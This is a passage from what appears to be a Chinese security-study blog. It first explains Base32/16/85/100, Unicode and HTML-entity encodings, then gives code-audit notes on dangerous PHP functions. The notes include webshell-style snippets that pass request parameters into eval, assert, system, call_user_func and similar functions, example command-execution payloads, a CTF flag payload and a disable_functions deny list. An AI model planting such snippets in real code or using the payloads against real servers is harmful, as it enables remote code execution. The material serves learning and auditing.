<p>十六进制：十进制的基础上加上了A-F 六个字母</p>
<p>Base58可以理解为一种58进制。</p>
<p>Base58包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
<p>但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721180316955.png"><img src="/Encrypted-ciphertext-features/image-20220721180316955.png" alt="image-20220721180316955"></a></p>
<h2 id="3、Base32——示例"><a href="#3、Base32——示例" class="headerlink" title="3、Base32——示例"></a>3、Base32——示例</h2><p><u><strong>GEZDGNBVGY3TQOJQGE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></u></p>
<p><u>他的特点是明文超过十个后面就会有很多等号</u></p>
<p>Base32使用了ASCII编码中可打印的<u>32个字符</u>(<strong>大写</strong>字母A-Z和数字2-7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”&#x3D;”，一个”&#x3D;”相当于一个组(5个二进制位)，编码后的数据是原先的8&#x2F;5倍.</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721180354078.png"><img src="/Encrypted-ciphertext-features/image-20220721180354078.png" alt="image-20220721180354078"></a></p>
<p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721180407579.png"><img src="/Encrypted-ciphertext-features/image-20220721180407579.png" alt="image-20220721180407579"></a></p>
<p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p>
<p><u>与Base64相比，Base32具有许多优点：</u></p>
<p>1.适合不区分大小写的文件系统，更利于人类口语交流或记忆。</p>
<p>2.结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号。</p>
<p>3.排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。</p>
<p>4.排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符。</p>
<p><u>Base32也比Base16有优势：</u></p>
<p><strong>·</strong>Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）</p>
<p><u>Base32的缺点：</u></p>
<p><strong>·</strong>Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。</p>
<h2 id="4、Base16——示例"><a href="#4、Base16——示例" class="headerlink" title="4、Base16——示例"></a>4、Base16——示例</h2><p><u><strong>61646D696E</strong></u></p>
<p>它的特点是<u>没有等号</u>并且<u>数字要多于字母</u></p>
<p>Base16编码的方式：</p>
<p>1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。</p>
<p>2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721193743306.png"><img src="/Encrypted-ciphertext-features/image-20220721193743306.png" alt="image-20220721193743306"></a></p>
<p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721193802684.png"><img src="/Encrypted-ciphertext-features/image-20220721193802684.png" alt="image-20220721193802684"></a></p>
<h2 id="5、Base85——示例"><a href="#5、Base85——示例" class="headerlink" title="5、Base85——示例"></a>5、Base85——示例</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p>
<p>特点是<u>奇怪的字符比较多</u>，但是很难出现等号</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721193845924.png"><img src="/Encrypted-ciphertext-features/image-20220721193845924.png" alt="image-20220721193845924"></a></p>
<h2 id="6、Base100——示例"><a href="#6、Base100——示例" class="headerlink" title="6、Base100——示例"></a>6、Base100——示例</h2><p><u><strong>????????????????????</strong></u></p>
<p>特点就是一堆Emoji表情</p>
<p>Base100编码&#x2F;解码工具（又名：Emoji表情符号编码&#x2F;解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721193925524.png"><img src="/Encrypted-ciphertext-features/image-20220721193925524.png" alt="image-20220721193925524"></a></p>
<h2 id="常用解密网站：-1"><a href="#常用解密网站：-1" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p>Base64：</p>
<p><code>tool.oschina.net</code></p>
<p><code>www.sojson.com</code></p>
<p><code>base64.us</code></p>
<p>Base58：</p>
<p><code>www.metools.info</code></p>
<p>Base32、16：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>Base100：</p>
<p><code>www.atoolbox.net</code></p>
<hr>
<h2 id="1、Unicode——汉字示例"><a href="#1、Unicode——汉字示例" class="headerlink" title="1、Unicode——汉字示例"></a>1、Unicode——汉字示例</h2><figure class="highlight cal"><table><tr><td class="code"><pre><span class="line">汉字示例&amp;<span class="string">#36825</span>（这）;、字母示例&amp;<span class="string">#116</span>（t）;、数字符号示例&amp;<span class="string">#53</span>（<span class="number">5</span>）;</span><br></pre></td></tr></table></figure>

<p>可以说Unicode与HTML实体编码是一个东西</p>
<p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721194526725.png"><img src="/Encrypted-ciphertext-features/image-20220721194526725.png" alt="image-20220721194526725"></a></p>
<h2 id="2、HTML实体编码——示例与Unicode相同"><a href="#2、HTML实体编码——示例与Unicode相同" class="headerlink" title="2、HTML实体编码——示例与Unicode相同"></a>2、HTML实体编码——示例与Unicode相同</h2><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p>
<p>这么做的目的主要有两个：<br>１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&lt; 或 &lt;<br>大于号这样写：&gt; 或 &gt;<br>前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。<br>２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721194551860.png"><img src="/Encrypted-ciphertext-features/image-20220721194551860.png" alt="image-20220721194551860"></a></p>
<h2 id="3、16进制Unicode——示例"><a href="#3、16进制Unicode——示例" class="headerlink" title="3、16进制Unicode——示例"></a>3、16进制Unicode——示例</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p>
<p><a data-fancybox="gallery" data-src="/Encrypted-ciphertext-features/image-20220721194631625.png"><img src="/Encrypted-ciphertext-features/image-20220721194631625.png" alt="image-20220721194631625"></a></p>
<p>常用解密网站：</p>
<p>  <strong>·</strong>Unicode：</p>
<p><code>www.sojson.com</code></p>
<p>  <strong>·</strong>16进制Unicode：</p>
<p><code>www.msxindl.com</code></p>
<p> <strong>·</strong>HTML字符实体：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>….还有一些引入密钥的非对称型算法，可以看看原文</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>crypto&amp;misc</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计知识点记录</title>
    <url>/Code-audit/</url>
    <content><![CDATA[<p><code>代码审计学习的一些笔记</code></p>
<span id="more"></span>

<h1 id="代码审计-常见php威胁函数（上）"><a href="#代码审计-常见php威胁函数（上）" class="headerlink" title="代码审计-常见php威胁函数（上）"></a>代码审计-常见php威胁函数（上）</h1><blockquote>
<p>文章来自<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">成都知道创宇</a></p>
</blockquote>
<h2 id="1-常见php回调函数，可调用其他命令-代码执行函数"><a href="#1-常见php回调函数，可调用其他命令-代码执行函数" class="headerlink" title="1.常见php回调函数，可调用其他命令&#x2F;代码执行函数"></a>1.常见php回调函数，可调用其他命令&#x2F;代码执行函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_walk</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_map</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_filter</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usort</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ob_start</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">可变函数$_GET<span class="selector-attr">[<span class="string">&#x27;a&#x27;</span>]</span>($_GET<span class="selector-attr">[<span class="string">&#x27;b&#x27;</span>]</span>)</span><br></pre></td></tr></table></figure>



<h2 id="2-常见php可执行系统命令的函数："><a href="#2-常见php可执行系统命令的函数：" class="headerlink" title="2.常见php可执行系统命令的函数："></a>2.常见php可执行系统命令的函数：</h2><p>system()、passthru()、exec()、shell_exec()、 pcntl_exec()、popen()、proc_open()</p>
<h2 id="3-常见php可代码执行的函数："><a href="#3-常见php可代码执行的函数：" class="headerlink" title="3.常见php可代码执行的函数："></a>3.常见php可代码执行的函数：</h2><p>eval()、assert()、preg_replace()、$</p>
<h2 id="4-禁用危险函数："><a href="#4-禁用危险函数：" class="headerlink" title="4.禁用危险函数："></a>4.禁用危险函数：</h2><p>php配置文件php.ini里有个disable_functions &#x3D; 配置选项，可自定义禁用某些php危险函数.如:disable_functions &#x3D;system,passthru,shell_exec,exec,popen</p>
<h2 id="一、可执行php代码的函数"><a href="#一、可执行php代码的函数" class="headerlink" title="一、可执行php代码的函数"></a>一、可执行php代码的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php 7.1.7 ，已经无法用call_user_func回调调用 test.php?cmd&#x3D;phpinfo(); preg_replace()  5.6以下可以执行 5.6以上仍然可以执行，但是会有警告 PHP7后已经不支持&#x2F;e修饰符  preg_replace(“&#x2F;test&#x2F;e”,$_GET[“h”],”jutst test”); &#x2F;&#x2F;将jutst  test以&#x2F;test正则匹配以h来替换 &#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码  ?h&#x3D;phpinfo() ${phpinfo()}</p>
<h2 id="二、常见php回调函数，可调用其他命令-代码执行函数："><a href="#二、常见php回调函数，可调用其他命令-代码执行函数：" class="headerlink" title="二、常见php回调函数，可调用其他命令&#x2F;代码执行函数："></a>二、常见php回调函数，可调用其他命令&#x2F;代码执行函数：</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p><code>call_user_func</code> — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数</p>
<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //命令执行</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="调用类中的函数"><a href="#调用类中的函数" class="headerlink" title="调用类中的函数"></a>调用类中的函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="title">php中 -&gt;与::</span> 调用类中的成员的区别</span><br><span class="line"></span><br><span class="line"> -&gt;用于动态语境处理某个类的某个实例</span><br><span class="line"> </span><br><span class="line"><span class="title"> ::</span>可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>

<p>所以这里<code>payload</code>为</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ctfshow</span>=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h4 id="调用类中的函数【数组】"><a href="#调用类中的函数【数组】" class="headerlink" title="调用类中的函数【数组】"></a>调用类中的函数【数组】</h4><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">call_user_func()参数不仅可以是字符串，还有 数组形式！</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="built_in">array</span>(<span class="symbol">$class</span>name, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span>[<span class="number">0</span>]=<span class="symbol">$class</span>name  类名</span><br><span class="line"><span class="built_in">array</span>[<span class="number">1</span>]=say_hello   say_hello()方法</span><br></pre></td></tr></table></figure>



<pre><code>按照上述格式得到payload：

ctfshow[]=ctfshow&amp;ctfshow[]=getFlag   #POST
</code></pre>
<h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()为数组的每个元素应用回调函数。返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true， 则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-可变函数-var-args"><a href="#7-可变函数-var-args" class="headerlink" title="7) 可变函数$var(args)"></a>7) 可变函数$var(args)</h3><p>PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数， 并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序 php5.6之前可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="9）uasort"><a href="#9）uasort" class="headerlink" title="9）uasort"></a>9）uasort</h3><p>php5.6 php7不可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="10）ob-start"><a href="#10）ob-start" class="headerlink" title="10）ob_start"></a>10）ob_start</h3><p>ob_start — 打开输出控制缓冲</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure>

<h2 id="三、常见php可执行系统命令的函数："><a href="#三、常见php可执行系统命令的函数：" class="headerlink" title="三、常见php可执行系统命令的函数："></a>三、常见php可执行系统命令的函数：</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-shell-exec"><a href="#4-shell-exec" class="headerlink" title="4) shell_exec()"></a>4) shell_exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>要求：linux系统特有模块，需编译选项中存在—enable-pcntl</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打一个进程通道</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//从通道取出内容</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">类似 <span class="title function_ invoke__">popen</span>() 函数， 但是 <span class="title function_ invoke__">proc_open</span>() 提供了更加强大的控制程序执行的能力</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 